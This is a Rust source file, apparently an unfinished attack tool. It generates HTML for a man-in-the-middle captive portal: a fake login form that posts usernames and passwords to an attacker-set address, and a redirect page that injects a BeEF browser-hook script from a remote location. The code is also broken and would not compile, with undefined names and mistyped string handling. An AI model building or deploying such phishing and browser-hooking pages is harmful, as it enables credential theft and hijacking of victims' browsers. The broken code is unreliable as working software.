use std::char;
use std::io::{self, Write};

fn serve_form(beefhook: bool, hook_loc: str, formaction: str, ){
  if beefhook == true {
    run_beef
  }
  let hook_location         = hook_loc;
  let html_login_head       ="<!DOCTYPE html><html><head><meta charset=\"utf-8\" /><title></title></head>";
  let html_form_body_top    = "<body><form class=\"login\" ";
  let form_action           = format!("{}{}{}" , "\"action=\"" , formaction , "\"");
  let html_form_body_bottom = " method=\"post\"><input type=\"text\" name=\"username\" value=\"username\">\
                              <input type=\"text\" name=\"password\" value=\"password\">\
                              <input type=\"submit\" name=\"submit\" value=\"submit\">\
                              </form></body></html>";  

  let submit_form_body: &'static str   = format!("{}{}{}{}" , html_login_head    , html_form_body_top , form_action , html_form_body_bottom);   

}

fn serve_redirect(redirect: i32, redir_messg: &str){
  let redirect_ip             = redirect;
  let redirect_message        = redir_messg;
  let html_redirect_head      = "<html><head>";
  let beef_hook               = format!("{}{}{}" , "<script src=" , hook_loc ,"></script>");
  let html_redirect_middle    = format!("{}{}{}" , "<meta http-equiv=\"refresh\" content=\"0; url=http://" , redirect_ip , "\" />");
  let redirect_bottom         = "</head><body><b>Redirecting to MITM hoasted captive portal page</b></body></html>";
  let html_redirect_body: &'static str = format!("{}{}{}{}" , html_redirect_head , beef_hook , html_redirect_middle , redirect_bottom);
}

fn make_html(beef_hook: bool, form_or_redirect: bool) {
    // Do they want the form or the redirect?
    if beef_hook == true {
      
    }
    if form_or_redirect == true {
      serve_html();
    }

  }